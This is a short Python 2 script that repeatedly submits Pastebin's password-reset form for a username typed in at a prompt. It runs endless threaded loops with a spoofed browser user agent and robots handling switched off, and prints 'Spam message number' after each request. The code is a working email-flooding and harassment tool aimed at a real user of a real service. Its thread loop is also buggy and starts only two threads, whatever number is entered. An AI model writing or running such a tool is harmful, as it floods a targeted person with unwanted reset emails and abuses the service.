import mechanize
import threading

def create(x):
    while 1:
        global nb
        try:
            br = mechanize.Browser()
            br.set_handle_robots(False)
            br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
            br.open('http://pastebin.com/passmailer')
            br.select_form(nr=1)
            br.form['user_name'] = x
            br.submit()
            nb+=1
            print "Spam message number " + str(nb)

        except:
            print "error"


userpastebin = raw_input("Pastebin username: ")
nbthreads = input("Number of threads: ")
nb = 0
for a in (0,nbthreads):
    threading.Thread(target=create, args=(userpastebin,)).start()

while 1:
    pass
